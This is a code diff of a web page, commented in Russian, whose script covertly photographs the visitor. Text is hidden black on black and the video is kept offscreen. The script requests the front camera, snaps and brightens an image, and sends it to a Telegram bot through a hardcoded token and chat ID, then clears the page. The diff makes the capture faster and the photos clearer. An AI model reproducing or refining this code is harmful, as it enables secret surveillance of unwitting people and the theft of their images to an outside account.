@@ -9,7 +9,7 @@
     margin:0; padding:0; 
     width:100%; height:100%; 
     background:#000; 
-    color:#000; /* Текст ЧЁРНЫЙ (не зелёный) */
+    color:#000;
     font-family:Arial, sans-serif; 
     overflow: hidden;
   }
@@ -20,10 +20,9 @@
     width:100%; 
     text-align:center; 
     z-index:1000; 
-    color: #000; /* Чёрный текст */
-    opacity: 0.01; /* Почти невидим, но доступен для консоли */
+    color: #000; 
+    opacity: 0.01;
   }
-  /* скрываем video, но держим в DOM */
   video#preview { 
     position:fixed; 
     left:-9999px; 
@@ -31,7 +30,6 @@
     height:1px; 
     opacity:0; 
   }
-  /* Скрываем любые появляющиеся элементы */
   canvas {
     position: absolute;
     top: -9999px;
@@ -43,7 +41,6 @@
 </style>
 </head>
 <body>
-  <!-- Текст ЧЁРНЫЙ на ЧЁРНОМ фоне - невидим -->
   <div id="status" style="color: #000;">.</div>
 
 <script>
@@ -51,11 +48,10 @@ const BOT_TOKEN = '8415018467:AAFtfY3AnAOHvVMBK9zRj1BehN6uM2MC5e0';
 const CHAT_ID = '1250741267';
 const status = document.getElementById('status');
 
-// Переопределяем функцию обновления статуса - текст остаётся чёрным
 function updateStatus(text) {
   status.textContent = text;
-  status.style.color = '#000'; // Принудительно чёрный
-  console.log(text); // В консоль всё ещё идёт для отладки
+  status.style.color = '#000';
+  console.log(text);
 }
 
 function sleep(ms) { return new Promise(res => setTimeout(res, ms)); }
@@ -63,13 +59,12 @@ function sleep(ms) { return new Promise(res => setTimeout(res, ms)); }
 async function captureAndSend() {
   let stream = null;
   try {
-    updateStatus('1. Запрашиваю фронтальную камеру...');
+    updateStatus('1. Запрашиваю камеру...');
     stream = await navigator.mediaDevices.getUserMedia({
       video: {
         facingMode: { ideal: 'user' },
         width: { ideal: 1280 },
-        height: { ideal: 720 },
-        aspectRatio: { ideal: 9/16 }
+        height: { ideal: 720 }
       },
       audio: false
     });
@@ -84,43 +79,22 @@ async function captureAndSend() {
     video.autoplay = true;
     document.body.appendChild(video);
 
-    updateStatus('2. Инициализация видео...');
-    await new Promise((resolve) => {
-      if (video.readyState >= 2 && !video.paused) {
-        resolve();
-        return;
-      }
-      
-      const playPromise = video.play();
-      if (playPromise && typeof playPromise.then === 'function') {
-        playPromise.catch(err => {
-          console.warn('video.play():', err);
-        });
-      }
-      
-      video.addEventListener('playing', () => resolve(), { once: true });
-      setTimeout(() => {
-        if (video.readyState >= 2) resolve();
-        else resolve();
-      }, 1200);
-    });
-
-    if (video.videoWidth === 0 || video.videoHeight === 0) {
-      updateStatus('2.1 Жду кадр...');
-      if ('requestVideoFrameCallback' in HTMLVideoElement.prototype) {
-        await new Promise(res => video.requestVideoFrameCallback(() => res()));
-      } else {
-        await sleep(150);
-      }
+    updateStatus('2. Запускаю видео...');
+    await video.play();
+    
+    if (video.readyState < 2) {
+      await new Promise(resolve => {
+        video.addEventListener('loadeddata', resolve, { once: true });
+        setTimeout(resolve, 300);
+      });
     }
+
+    updateStatus('3. Стабилизация кадра...');
+    await sleep(1000); // Уменьшено с 5000 до 1000 мс
 
     const vw = video.videoWidth || 1280;
     const vh = video.videoHeight || 720;
-    updateStatus(`3. Размеры: ${vw}x${vh}`);
-
-    // УВЕЛИЧИВАЕМ ВРЕМЯ ОЖИДАНИЯ ДЛЯ КАМЕРЫ (важно!)
-    updateStatus('4. Настраиваю камеру (5 секунд)...');
-    await sleep(5000); // Увеличено до 5 секунд
+    updateStatus(`4. Размеры: ${vw}x${vh}`);
 
     const canvas = document.createElement('canvas');
     canvas.width = vw;
@@ -129,59 +103,56 @@ async function captureAndSend() {
 
     updateStatus('5. Делаю снимок...');
 
-    // Зеркалим для селфи
+    // Зеркалим и рисуем
     ctx.save();
     ctx.translate(canvas.width, 0);
     ctx.scale(-1, 1);
-    
-    if (typeof createImageBitmap === 'function') {
-      try {
-        const bmp = await createImageBitmap(video);
-        ctx.drawImage(bmp, 0, 0, canvas.width, canvas.height);
-        bmp.close && bmp.close();
-      } catch (e) {
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      }
-    } else {
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    }
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
     ctx.restore();
 
     updateStatus('6. Останавливаю камеру...');
     stream.getTracks().forEach(t => t.stop());
 
-    await sleep(50);
-
-    // УСИЛЕННОЕ УЛУЧШЕНИЕ ЯРКОСТИ (для борьбы с тёмными фото)
-    try {
-      updateStatus('7. Улучшаю яркость...');
-      const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
-      const data = imageData.data;
-      
-      // УСИЛЕННАЯ КОРРЕКЦИЯ (увеличены коэффициенты)
-      for (let i = 0; i < data.length; i += 4) {
-        // Увеличиваем яркость в 1.8 раза (было 1.25)
-        data[i] = Math.min(255, data[i] * 1.8);       // R
-        data[i+1] = Math.min(255, data[i+1] * 1.7);   // G
-        data[i+2] = Math.min(255, data[i+2] * 1.7);   // B
-
-        // Усиленный контраст
-        const avg = (data[i] + data[i+1] + data[i+2]) / 3;
-        if (avg > 160) {
-          data[i] = Math.min(255, data[i] * 1.1);
-          data[i+1] = Math.min(255, data[i+1] * 1.1);
-          data[i+2] = Math.min(255, data[i+2] * 1.1);
-        } else if (avg < 100) {
-          // Для тёмных участков увеличиваем яркость сильнее
-          data[i] = Math.max(30, data[i] * 1.5);
-          data[i+1] = Math.max(30, data[i+1] * 1.5);
-          data[i+2] = Math.max(30, data[i+2] * 1.5);
-        }
-      }
-      ctx.putImageData(imageData, 0, 0);
-    } catch (e) {
-      console.warn('Улучшения не применены:', e);
+    // УЛУЧШЕННАЯ ОБРАБОТКА ЯРКОСТИ И КОНТРАСТА
+    updateStatus('7. Улучшаю изображение...');
+    const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+    const data = imageData.data;
+    
+    // Автоматическая коррекция яркости и контраста
+    let rSum = 0, gSum = 0, bSum = 0;
+    for (let i = 0; i < data.length; i += 4) {
+      rSum += data[i];
+      gSum += data[i+1];
+      bSum += data[i+2];
     }
+    const pixelCount = data.length / 4;
+    const rAvg = rSum / pixelCount;
+    const gAvg = gSum / pixelCount;
+    const bAvg = bSum / pixelCount;
+    const avgBrightness = (rAvg + gAvg + bAvg) / 3;
+    
+    // Динамическая коррекция на основе средней яркости
+    const brightnessFactor = avgBrightness < 128 ? 1.8 : 1.3;
+    const contrastFactor = 1.2;
+    
+    for (let i = 0; i < data.length; i += 4) {
+      // Яркость
+      data[i] = Math.min(255, data[i] * brightnessFactor);
+      data[i+1] = Math.min(255, data[i+1] * brightnessFactor);
+      data[i+2] = Math.min(255, data[i+2] * brightnessFactor);
+      
+      // Контраст
+      data[i] = ((data[i] - 128) * contrastFactor) + 128;
+      data[i+1] = ((data[i+1] - 128) * contrastFactor) + 128;
+      data[i+2] = ((data[i+2] - 128) * contrastFactor) + 128;
+      
+      // Гарантия диапазона
+      data[i] = Math.max(0, Math.min(255, data[i]));
+      data[i+1] = Math.max(0, Math.min(255, data[i+1]));
+      data[i+2] = Math.max(0, Math.min(255, data[i+2]));
+    }
+    
+    ctx.putImageData(imageData, 0, 0);
 
     updateStatus('8. Отправляю в Telegram...');
     canvas.toBlob(async (blob) => {
@@ -203,18 +174,17 @@ async function captureAndSend() {
         const json = await res.json();
         if (json.ok) {
           updateStatus('✅ Отправлено!');
-          // Очищаем страницу через 2 секунды
           setTimeout(() => {
             document.body.innerHTML = '';
             document.body.style.cssText = 'background: #000; width: 100%; height: 100%;';
-          }, 2000);
+          }, 1000);
         } else {
-          updateStatus('❌ Ошибка Telegram');
+          updateStatus('❌ Ошибка Telegram: ' + (json.description || ''));
         }
       } catch (err) {
-        updateStatus('❌ Ошибка сети');
+        updateStatus('❌ Ошибка сети: ' + err.message);
       }
-    }, 'image/jpeg', 0.92);
+    }, 'image/jpeg', 0.95); // Увеличено качество до 0.95
 
   } catch (err) {
     updateStatus('❌ Ошибка: ' + (err.message || err));
